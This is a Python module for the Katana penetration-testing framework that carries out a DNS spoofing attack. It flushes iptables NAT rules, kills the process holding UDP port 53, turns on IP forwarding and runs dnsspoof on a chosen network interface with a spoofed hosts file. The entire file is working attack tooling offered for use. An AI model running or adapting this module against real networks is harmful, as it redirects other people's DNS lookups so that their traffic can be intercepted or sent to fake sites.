# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KATANAFRAMEWORK import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  
from core.Function import get_gateway,isConect,Subprocess,checkDevice,get_interfaces
import commands
# END LIBRARIES  

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="DNS Spoofing"
	init.CodeName           ="net/dns.spoof"
	init.DateCreation       ="29/07/2016"      
	init.LastModification   ="29/07/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME      VALUE               RQ     DESCRIPTION
		'interface':[INTERFACE_ETHERNET,True ,'Interface'],
		'hostfile' :["files/test/host" ,True ,'DNS\'s Spoofed File']
	}

	init.aux = """
 Devices Founds: """+str(get_interfaces())+"""
 Functions     : to edit the DNS rules. 'x::nano """+init.options['hostfile'][0]+"""'
	"""
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):
	if isConect() and checkDevice(init.var['interface']):
		Loadingfile(init.var['hostfile'])
		open(init.var['hostfile'],'r')
		printAlert(0,"Starting DNS spoofing [dnsspoof].")
		commands.getoutput("iptables --flush -t nat")
		commands.getoutput("sudo fuser -kuv 53/udp  >/dev/null 2>&1 ")
		commands.getoutput("echo 1 > /proc/sys/net/ipv4/ip_forward")
		Subprocess("dnsspoof -i "+init.var['interface']+" -f "+init.var['hostfile'])
		raw_input(printAlert(8,"to Stop DNS Spoof Attack (PRESS ANY KEY)\n"))
		commands.getoutput("killall dnsspoof")
		commands.getoutput("echo 0 > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush -t nat")

# END CODE MODULE ############################################################################################
